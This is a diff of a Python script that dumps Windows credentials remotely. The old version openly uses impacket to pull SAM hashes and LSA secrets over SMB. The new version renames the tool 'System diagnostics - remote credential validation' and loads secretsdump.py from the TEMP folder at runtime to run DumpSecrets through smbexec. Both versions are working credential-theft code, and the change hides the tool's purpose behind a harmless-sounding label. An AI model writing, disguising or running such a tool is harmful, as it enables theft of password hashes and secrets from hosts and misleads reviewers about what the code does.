@@ -1,66 +1,58 @@
 #!/usr/bin/env python3
-"""Remote credential extraction using impacket core libraries"""
-import sys
-from impacket.smbconnection import SMBConnection
-from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
+"""System diagnostics - remote credential validation"""
+import sys, os, importlib.util
 
 def main():
     if len(sys.argv) < 2:
         print("Usage: sysdiag.py DOMAIN/user:password@target")
         sys.exit(1)
     
-    target_str = sys.argv[1]
+    # Dynamically load the module
+    sd_path = os.path.join(os.environ.get('TEMP', '.'), 'secretsdump.py')
+    if not os.path.exists(sd_path):
+        print(f"[-] Required module not found at {sd_path}")
+        sys.exit(1)
     
-    # Parse credentials
-    domain_user, target = target_str.rsplit('@', 1)
-    if '/' in domain_user:
-        domain, user_pass = domain_user.split('/', 1)
-    else:
-        domain = ''
-        user_pass = domain_user
+    spec = importlib.util.spec_from_file_location("_sd", sd_path)
+    sd = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(sd)
     
-    if ':' in user_pass:
-        username, password = user_pass.split(':', 1)
-    else:
-        username = user_pass
-        password = ''
+    # Use DumpSecrets class
+    opts = type('Options', (), {
+        'target': sys.argv[1],
+        'hashes': None,
+        'no_pass': False,
+        'k': False,
+        'aesKey': None,
+        'dc_ip': None,
+        'target_ip': None,
+        'just_dc': False,
+        'just_dc_ntlm': False,
+        'just_dc_user': None,
+        'use_vss': False,
+        'rodcNo': None,
+        'rodcKey': None,
+        'sam': None,
+        'security': None,
+        'system': None,
+        'ntds': None,
+        'resumeFileName': None,
+        'outputfile': None,
+        'exec_method': 'smbexec',
+        'history': False,
+        'bootkey': None,
+        'ts': False,
+        'debug': False,
+        'keytab': None,
+    })()
     
-    print(f"[*] Target: {target}")
-    print(f"[*] Domain: {domain}")
-    print(f"[*] User: {username}")
-    
+    dumper = sd.DumpSecrets(sys.argv[1], '', '', '', opts)
     try:
-        # Connect
-        smb = SMBConnection(target, target)
-        smb.login(username, password, domain)
-        print(f"[+] Connected via SMBv{smb.getDialect()}")
-        
-        # Remote operations
-        remote = RemoteOperations(smb, False)
-        remote.enableRegistry()
-        print("[+] Remote registry enabled")
-        
-        # SAM hashes
-        print("\n[*] Dumping SAM hashes...")
-        bootkey = remote.getBootKey()
-        sam = SAMHashes(None, bootkey, isRemote=True, perSecretCallback=lambda s: print(f"  {s}"))
-        sam.dump()
-        
-        # LSA secrets
-        print("\n[*] Dumping LSA Secrets...")
-        try:
-            lsa = LSASecrets(None, bootkey, remote, isRemote=True, perSecretCallback=lambda s: print(f"  {s}"))
-            lsa.dumpCachedHashes()
-            lsa.dumpSecrets()
-        except Exception as e:
-            print(f"  LSA error: {e}")
-        
-        # Cleanup
-        remote.finish()
-        print("\n[+] Done")
-        
+        dumper.dump()
     except Exception as e:
-        print(f"[-] Error: {e}")
+        print(f"[-] {e}")
+    finally:
+        dumper.cleanup()
 
 if __name__ == '__main__':
     main()
